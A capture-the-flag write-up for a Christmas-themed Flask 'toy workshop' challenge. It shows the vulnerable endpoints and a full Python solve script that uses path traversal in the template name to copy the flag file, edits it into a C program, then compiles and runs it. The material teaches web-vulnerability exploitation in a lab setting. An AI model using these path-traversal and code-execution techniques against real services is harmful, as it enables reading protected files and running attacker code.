# Challenge 8

## Description

```
🔨⚙️🧵 Santa’s Workshop of Jingly Jinja Magic 🎁✨🛠️

Hidden between a tower of half-painted rocking horses and a drift of cinnamon-scented sawdust lies a cozy corner of Santa’s Workshop 🎄✨. A crooked little sign hangs above it, dusted with snowflakes and glitter: TINKER → BUILD → PLAY.

Here, elves shuffle about with scraps of blueprints—teddy bears waiting for their whispered secrets 🧸, wooden trains craving extra “choo” 🚂, and tin robots frozen mid-twirl 🤖✨. Each blueprint is just a fragment at first, patched with tiny gaps where holiday magic (and the occasional variable) gets poured in.

Once an elf has fussed over a design—nudging, scribbling, humming carols as they go—it’s fed into the clanky old assembler, a machine that wheezes peppermint steam and occasionally complains in compiler warnings ❄️💥. But when the gears settle and the lights blink green, out pops something wondrous:

A toy that runs.

Suddenly the workshop sparkles with noise—beeps, choos, secrets, giggles. Each creation takes its first breath of output, wide-eyed and ready to play 🎁💫.

It’s a tiny corner of the North Pole, but this is where Christmas cheer is written, compiled, and sent twinkling into the world.
```

## Analysis

In this challenge, there is a webserver with 4 endpoints:

* `create`
* `tinker`
* `assemble`
* `play`

The endpoints simulate a toy-creating pipeline, creating a toy, tinkering with
it, assembling it and playing with it.

* `create` takes a filename from the `TEMPLATE_DIR` and copies it into `TINKERING_DIR`, using a random id as an identiier.
* `tinker` lets you replace the contents of a toy with something else.
* `assemble` compiles a given toy
* `play` executes the toy.

Both the compilation and the execution drop privileges before executing.

When specifying the `create` endpoint, you can do path traversal to go back and
create a toy using the `/flag` file.

```python
@app.route("/create", methods=["POST"])
def create():
    payload = request.get_json(force=True, silent=True) or {}
    template = payload.get("template")
    if not template:
        return jsonify({"error": "missing template"}), 400
    bp = TEMPLATES_DIR / template
    if not bp.exists():
        templates = sorted([path.name for path in TEMPLATES_DIR.glob("*")])
        return jsonify({"error": "unknown template", "templates": templates}), 404

    toy_id = secrets.token_hex(8)
    src = TINKERING_DIR / toy_hash(toy_id)
    shutil.copyfile(bp, src)
    return jsonify({"toy_id": toy_id})
```

So basically the steps to solve this challenge are:

* `create` from `../../../../flag`
* `tinker` to edit it into a valid C program that prints the flag.
* `assemble`
* `play`

We know that the flag file contains a new line at the end, so we can convert it
into something like this:

```c
#include <stdio.h>
#define XSTR(X) #X
#define STR(X) XSTR(X)
#define FLAG pwn.college{practice}

int main(void) {
  fprintf(stderr, "%s\n", STR(FLAG));
  return 0;
}
```

The `tinker` endpoints has two modes, one for replacing substrings at a given
index and one for finalizing the template.

```python
@app.route("/tinker/<toy_id>", methods=["POST"])
def tinker(toy_id: str):
    payload = request.get_json(force=True, silent=True) or {}
    op = payload.get("op")
    src = TINKERING_DIR / toy_hash(toy_id)
    if not src.exists():
        return jsonify({"status": "error", "error": "toy not found"}), 404

    text = src.read_text()

    if op == "replace":
        idx = int(payload.get("index", 0))
        length = int(payload.get("length", 0))
        content = payload.get("content", "")
        new_text = text[:idx] + content + text[idx + length :]
        src.write_text(new_text)
        return jsonify({"status": "tinkered"})

    if op == "render":
        ctx = payload.get("context", {})
        rendered = render_template_string(text, **ctx)
        src.write_text(rendered)
        return jsonify({"status": "tinkered"})

    return jsonify({"status": "error", "error": "bad op"}), 400
```

So the idea would be to replace everything before the flag (at index 0), with
the code that we want to place before it, and the pick an index far beyond the
end of the flag plus what we add to place everything that comes after.

The script to interact with the webserver and solve the challenge:

```python
#!/usr/bin/python3

import requests

_URL = "http://localhost"

_PAYLOAD_PREFIX=r"""
#include <stdio.h>
#define XSTR(X) #X
#define STR(X) XSTR(X)
#define FLAG """

_PAYLOAD_SUFFIX=r"""
int main(void) {
  fprintf(stderr, "%s\n", STR(FLAG));
  return 0;
}
"""

def main():
    create_payload = {
        "template": "../../../../../flag"
    }

    response = requests.post(f"{_URL}/create", json=create_payload)
    assert response.status_code == 200

    toy_id = response.json()["toy_id"]

    tinker_payloads = [{
        "op": "replace",
        "index": 0,
        "length": 0,
        "content": _PAYLOAD_PREFIX
    },
    {
        "op": "replace",
        "index": len(_PAYLOAD_PREFIX) + 100,
        "length": 0,
        "content": _PAYLOAD_SUFFIX
    },
    {
        "op": "render",
    }
    ]

    for tinker_payload in tinker_payloads:
        response = requests.post(f"{_URL}/tinker/{toy_id}", json=tinker_payload)
        assert response.status_code == 200, f"tinkering failed {response.status_code}"
        assert response.json()["status"] == "tinkered"

    response = requests.post(f"{_URL}/assemble/{toy_id}", json={})
    assert response.status_code == 200, f"assembling failed {response.status_code}"
    assert response.json()["status"] == "assembled"

    response = requests.post(f"{_URL}/play/{toy_id}", json={})
    assert response.status_code == 200
    response_json = response.json()

    print(response_json["stdout"])
    print(response_json["stderr"])
    print(response_json["returncode"])
    

if __name__ == "__main__":
    main()
```
